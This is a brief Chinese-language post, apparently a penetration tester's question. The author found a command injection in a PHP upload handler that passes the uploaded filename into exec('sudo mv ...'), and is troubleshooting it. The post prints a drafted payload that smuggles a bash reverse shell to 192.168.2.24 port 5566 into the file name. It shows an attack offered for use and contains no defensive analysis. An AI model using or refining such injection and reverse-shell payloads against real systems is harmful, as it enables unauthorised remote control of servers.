在web渗透的过程中，我发现了一个任意文件读取漏洞，通过读取文件上传的代码。我发现他的文件上传功能有命令执行漏洞。
![[Screenshot_2026-07-20_22_45_27 1.png]]
我的思路是在
```
exec("sudo mv " .$target. " " .$homedir . $_FILES['uploaded']['name']);
```
注入payload,就是选择不自动解压gzip功能的那个分支。

我草拟了一个payload的
```
2.jpg;/bin/bash -i >& /dev/tcp/192.168.2.24/5566 0>&1;
```

但是执行的结果是'5566 0>&1;'。